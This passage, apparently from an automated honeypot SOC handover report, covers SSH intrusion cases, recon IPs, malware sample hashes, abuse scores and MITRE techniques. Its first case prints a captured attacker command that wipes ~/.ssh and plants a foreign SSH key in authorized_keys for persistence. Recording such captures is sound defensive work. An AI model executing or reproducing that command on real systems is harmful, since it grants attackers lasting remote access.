| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 19:32:59` | `cowrie.session.connect` |
| `2026-05-18 19:32:59` | `cowrie.client.version` |
| `2026-05-18 19:32:59` | `cowrie.client.kex` |
| `2026-05-18 19:33:00` | `cowrie.login.success` |
| `2026-05-18 19:33:05` | `cowrie.session.params` |
| `2026-05-18 19:33:05` | `cowrie.command.input` |
| `2026-05-18 19:33:05` | `cowrie.command.failed` |
| `2026-05-18 19:33:06` | `cowrie.log.closed` |
| `2026-05-18 19:33:06` | `cowrie.session.params` |
| `2026-05-18 19:33:06` | `cowrie.command.input` |
| `2026-05-18 19:33:06` | `cowrie.session.file_download` |
| `2026-05-18 19:33:06` | `cowrie.log.closed` |
| `2026-05-18 19:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.60[.]44` to AbuseIPDB if not already reported
- [ ] Block `120.48.60[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dd7e300d2ed

| Field | Detail |
|---|---|
| **Source IP** | `120.48.60[.]44` |
| **First Seen** | 2026-05-18 19:33 |
| **Last Seen** | 2026-05-18 19:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 19:33:16` | `cowrie.session.connect` |
| `2026-05-18 19:33:16` | `cowrie.client.version` |
| `2026-05-18 19:33:16` | `cowrie.client.kex` |
| `2026-05-18 19:33:21` | `cowrie.login.success` |
| `2026-05-18 19:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.60[.]44` to AbuseIPDB if not already reported
- [ ] Block `120.48.60[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.148.120[.]187` | **41** | 2026-05-18 16:52 | 2026-05-18 19:48 | 53m | 0 | `T1592` | 🟠 MEDIUM |
| `120.48.60[.]44` | **18** | 2026-05-18 19:14 | 2026-05-18 19:35 | 25m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `175.107.31[.]20` | **3** | 2026-05-18 18:03 | 2026-05-18 19:33 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]31` | **2** | 2026-05-18 18:35 | 2026-05-18 18:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.12.149[.]123` | 1 | 2026-05-18 18:57 | 2026-05-18 18:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.199.90[.]73` | 1 | 2026-05-18 17:09 | 2026-05-18 17:09 | 13s | 0 | `T1592` | 🟢 LOW |
| `129.226.93[.]131` | 1 | 2026-05-18 18:54 | 2026-05-18 18:54 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.117[.]73` | 1 | 2026-05-18 19:39 | 2026-05-18 19:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.190.216[.]105` | 1 | 2026-05-18 18:51 | 2026-05-18 18:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.16.168[.]11` | 1 | 2026-05-18 19:44 | 2026-05-18 19:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `44.220.188[.]203` | 1 | 2026-05-18 19:03 | 2026-05-18 19:03 | 5s | 0 | `T1592` | 🟢 LOW |
| `49.51.73[.]108` | 1 | 2026-05-18 19:09 | 2026-05-18 19:09 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.240.223[.]240` | 1 | 2026-05-18 17:03 | 2026-05-18 17:03 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.240.223[.]240` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `129.226.93[.]131` | SG | Tencent Building, Kejizhongyi Avenue | **100** ⚠️ | 4 |
| `210.16.168[.]11` | CN | Hubei Feixun Network Co., Ltd | **100** ⚠️ | 50 |
| `175.107.31[.]20` | PK | National Telecommunication Corporation | **100** ⚠️ | 2 |
| `14.103.117[.]73` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `172.190.216[.]105` | US | Microsoft Limited | **100** ⚠️ | 22 |
| `152.136.57[.]182` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 4 |
| `49.51.73[.]108` | US | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 6 |
| `66.132.195[.]31` | US | Censys, Inc. | **100** ⚠️ | 49 |
| `120.48.60[.]44` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 60 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 24 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 17 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (57 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 24 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 31 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 142 cases |
| Tool 34  | Credential Extractor        | ✅ 41 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 27 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 57 filtered (40.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 22 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 13 recon entry/entries in table (4 group(s) consolidating 64 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-18T19:49:23Z_
